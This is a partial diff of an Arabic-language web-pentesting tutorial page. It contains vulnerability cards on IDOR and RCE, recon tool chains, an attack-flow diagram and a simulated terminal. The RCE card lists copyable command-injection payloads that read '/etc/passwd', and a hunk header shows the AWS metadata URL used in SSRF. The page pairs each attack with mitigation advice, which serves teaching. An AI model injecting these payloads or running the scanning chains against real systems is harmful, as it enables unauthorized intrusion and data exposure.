-            <h4>🛡️ Mitigation:</h4>
-            <p>تفعيل الـ Whitelisting للنطاقات المسموح بالاتصال بها، وحجب الشبكات المحلية الداخليّة (RFC 1918).</p>
-          </div>
-        </div>
-
-        <div id="vuln-idor" class="vuln-pane">
-          <div class="cyber-card border-purple">
-            <h3>🔑 Insecure Direct Object Reference (IDOR)</h3>
-            <p><strong>Description:</strong> إمكانية وصول المستخدم لبيانات مستخدمين آخرين بمجرد تغيير رقم الـ ID أو الاسم في الطلب لغياب التحقق من الصلاحيات.</p>
-            
-            <h4>🚀 Scenario:</h4>
-            <p>طلب الرابط <code>/api/v1/invoice?id=1001</code> وتعديله إلى <code>?id=1002</code> لرؤية فاتورة مستخدم آخر.</p>
-            
-            <h4>🛡️ Mitigation:</h4>
-            <p>تنفيذ نظام تحقق صارم من الصلاحيات على مستوى الكود (Object-level Access Control) في كل طلب.</p>
-          </div>
-        </div>
-
-        <div id="vuln-rce" class="vuln-pane">
-          <div class="cyber-card border-purple">
-            <h3>💻 Remote Code Execution (RCE)</h3>
-            <p><strong>Description:</strong> أخطر أنواع الثغرات، تتيح للمهاجم تنفيذ أوامر نظام التشغيل مباشرة على السيرفر المصاب.</p>
-            
-            <h4>🚀 Common Payloads:</h4>
-            <div class="cmd-ui-box">
-              <div class="cmd-ui-top">; whoami
-| cat /etc/passwd
-`id`</div>
-              <div class="cmd-ui-bottom">
-                <button class="cmd-btn" onclick="copyText('; whoami', this)">📋 Copy</button>
-              </div>
-            </div>
-            
-            <h4>🛡️ Mitigation:</h4>
-            <p>تجنب استخدام الدوال البرمجية التي تنفذ أوامر النظام مثل (system, exec, eval) وتعقيم مدخلات المستخدم بالكامل.</p>
-          </div>
-        </div>
-
-      </div>
-
-      <!-- Phase 15: Attack Flow Visual -->
-      <div class="meth-content-view" id="meth-content-p15" style="display: none; --tool-color: #00e5ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎯</span> Phase 15: Attack Flow Diagram</h2>
-          <p class="hero-tagline">المسار البصري التفاعلي لعمليات صيد الثغرات (Pentesting Lifecycle)</p>
-        </div>
-
-        <div class="cyber-card">
-          <p>انقر على أي مرحلة في المخطط البصري للانتقال إلى قسمها الخاص مباشرة:</p>
-          <div class="flow-visualization">
-            <div class="flow-node active-stage" onclick="openMethPhase('p2')">1. Recon & Subdomains</div>
-            <div class="flow-arrow">▼</div>
-            <div class="flow-node" onclick="openMethPhase('p3')">2. Port Scanning</div>
-            <div class="flow-arrow">▼</div>
-            <div class="flow-node" onclick="openMethPhase('p4')">3. Directory Discovery (Fuzzing)</div>
-            <div class="flow-arrow">▼</div>
-            <div class="flow-node" onclick="openMethPhase('p5')">4. Web Crawling & JS</div>
-            <div class="flow-arrow">▼</div>
-            <div class="flow-node" onclick="openMethPhase('p14')">5. Vulnerability Exploitation</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 16: Tool Chains -->
-      <div class="meth-content-view" id="meth-content-p16" style="display: none; --tool-color: #9b59ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚙️</span> Phase 16: Automated Tool Chains</h2>
-          <p class="hero-tagline">بناء سلاسل الأدوات وخطوط الأنابيب البرمجية لأتمتة الاستكشاف</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🔗 Automation Pipelines</h3></div>
-          <p>المخترقون المحترفون لا يشغلون الأدوات بشكل منفصل، بل يربطون مخرجات كل أداة بمدخلات الأداة التالية.</p>
-
-          <h4>1. JS Recon Pipeline:</h4>
-          <p>الزحف -> تجميع ملفات JS -> كشف الأسرار والثغرات التلقائية:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">katana -u https://target.com -jc | grep -E "\.js$" | xargs -I %% python3 SecretFinder.py -i %% -o cli</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('katana -u https://target.com -jc | grep -E &quot;\\.js$&quot; | xargs -I %% python3 SecretFinder.py -i %% -o cli', this)">📋 Copy</button>
-            </div>
-          </div>
-
-          <h4>2. Subdomains vulnerability scanner chain:</h4>
-          <p>جمع النطاقات الحية -> فحص الثغرات الأمنية المعروفة (CVEs) تلقائياً:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -severity critical,high</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -severity critical,high', this)">📋 Copy</button>
+              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -silent | httpx -silent | nuclei -t cves/', this)">📋 Copy</button>
               <button class="cmd-btn run-btn" onclick="triggerTerminalSim('cat subs.txt | httpx | nuclei')">▶ Run Simulator</button>
             </div>
           </div>
+
+          <h4>2. Advanced Recon Chain Flow:</h4>
+          <div class="workflow-tree">
+            subfinder -d target.com -silent<br>
+            └── httpx -silent (Check active)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;└── naabu -silent (Quick ports check)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── katana -jc -silent (JS routes crawl)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── nuclei -severity high,critical (Vulnerabilities check)
+          </div>
         </div>
       </div>
 
-      <!-- Phase 17: Interactive Labs -->
-      <div class="meth-content-view" id="meth-content-p17" style="display: none; --tool-color: #00ff66;">
+      <!-- Phase 18: Interactive Labs -->
+      <div class="meth-content-view" id="meth-content-p18" style="display: none; --tool-color: #bf80ff;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🧪</span> Phase 17: Interactive Vulnerability Labs</h2>
-          <p class="hero-tagline">بيئة تفاعلية لاختبار وفهم استغلال الثغرات بشكل مباشر داخل المتصفح</p>
+          <h2 class="hero-title"><span class="hero-icon">🧪</span> 19. Interactive Vulnerability Labs</h2>
+          <p class="hero-tagline">بيئة عملية لمحاكاة واختبار استغلال الثغرات بشكل مباشر في المتصفح</p>
         </div>
 
         <!-- LAB 1: XSS -->
@@ -1274,15 +1447,15 @@ http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
         </div>
       </div>
 
-      <!-- Phase 18: Simulated Shell -->
-      <div class="meth-content-view" id="meth-content-p18" style="display: none; --tool-color: #00ff66;">
+      <!-- Phase 19: Simulated Shell -->
+      <div class="meth-content-view" id="meth-content-p19" style="display: none; --tool-color: #00ff66;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🐚</span> Phase 18: Interactive Simulator Shell</h2>
-          <p class="hero-tagline">موجه أوامر تفاعلي لتجربة أدوات فحص ثغرات الويب بنقرة واحدة</p>
+          <h2 class="hero-title"><span class="hero-icon">🐚</span> 20. Simulated Interactive Terminal Shell</h2>
+          <p class="hero-tagline">طرفية تفاعلية تحاكي مخرجات أدوات الفحص الحقيقية</p>
         </div>
 
         <div class="cyber-card">
-          <p>اكتب <code>help</code> لعرض قائمة الأوامر المتاحة، أو اكتب أوامر مثل <code>subfinder -d target.com</code> أو <code>nuclei</code> لتجربتها:</p>
+          <p>اكتب <code>help</code> لعرض قائمة الأوامر المتاحة، أو اكتب أوامر مثل <code>subfinder -d target.com</code> لتجربتها:</p>
           
           <div class="term-container">
             <div class="term-titlebar">
@@ -1302,24 +1475,6 @@ http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
               <input type="text" id="termInput" class="term-field" placeholder="Enter command..." autofocus>
             </div>
           </div>
-        </div>
-      </div>
-
-      <!-- Phase 19: Writeups & Resources -->
-      <div class="meth-content-view" id="meth-content-p19" style="display: none; --tool-color: #ffb020;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📖</span> Phase 19: Writeups & Resources</h2>
-          <p class="hero-tagline">أقوى المصادر والتقارير الأمنية لتعلم مستمر وتوثيق ثغرات حقيقي</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>📚 Essential Learning Platforms</h3></div>
-          <ul class="t-check-list">
-            <li>✔ <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a>: المرجع الأول والمنصة الأفضل لتعلم واختبار ثغرات الويب عملياً.</li>
-            <li>✔ <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">OWASP Web Security Testing Guide</a>: الدليل الرسمي والمقياس الأفضل لاختبار أمان التطبيقات.</li>
-            <li>✔ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a>: مستودع الأكواد والـ Payloads الأشهر الذي يستعين به كل بنتيستر.</li>
-            <li>✔ <a href="https://book.hacktricks.wiki" target="_blank" rel="noopener">HackTricks</a>: موسوعة أمنية شاملة لكل تقنيات اختراق الأنظمة والويب والسحاب.</li>
-          </ul>
         </div>
       </div>
 
@@ -1363,11 +1518,11 @@ http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
       // Auto update active node in attack flow if visible
       const nodes = document.querySelectorAll('.flow-node');
       nodes.forEach(node => node.classList.remove('active-stage'));
-      if (phaseId === 'p2' && nodes[0]) nodes[0].classList.add('active-stage');
-      if (phaseId === 'p3' && nodes[1]) nodes[1].classList.add('active-stage');
-      if (phaseId === 'p4' && nodes[2]) nodes[2].classList.add('active-stage');
-      if (phaseId === 'p5' && nodes[3]) nodes[3].classList.add('active-stage');
-      if (phaseId === 'p14' && nodes[4]) nodes[4].classList.add('active-stage');
+      if (phaseId === 'p0' && nodes[0]) nodes[0].classList.add('active-stage');
+      if (phaseId === 'p1' && nodes[1]) nodes[1].classList.add('active-stage');
+      if (phaseId === 'p6' && nodes[2]) nodes[2].classList.add('active-stage');
+      if (phaseId === 'p3' && nodes[3]) nodes[3].classList.add('active-stage');
+      if (phaseId === 'p7' && nodes[4]) nodes[4].classList.add('active-stage');
     }
 
     // Switch Vuln Database Tabs
@@ -1408,11 +1563,13 @@ http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
       }
     }
 
+    // Close XSS Modal
     function closePopupModal() {
       document.getElementById('popupOverlay').style.display = 'none';
       document.getElementById('popupModal').style.display = 'none';
     }
 
+    // IDOR Lab
     function runIDORLab() {
       const val = document.getElementById('idorInput').value;
       const res = document.getElementById('idorResult');
@@ -1527,7 +1684,7 @@ http://169.254.169.254/latest/meta-data/ (AWS Metadata)</div>
 
     // Trigger terminal tab and run command simulation
     function triggerTerminalSim(cmd) {
-      openMethPhase('p18');
+      openMethPhase('p19');
       executeTermCmd(cmd);
     }
   </script>
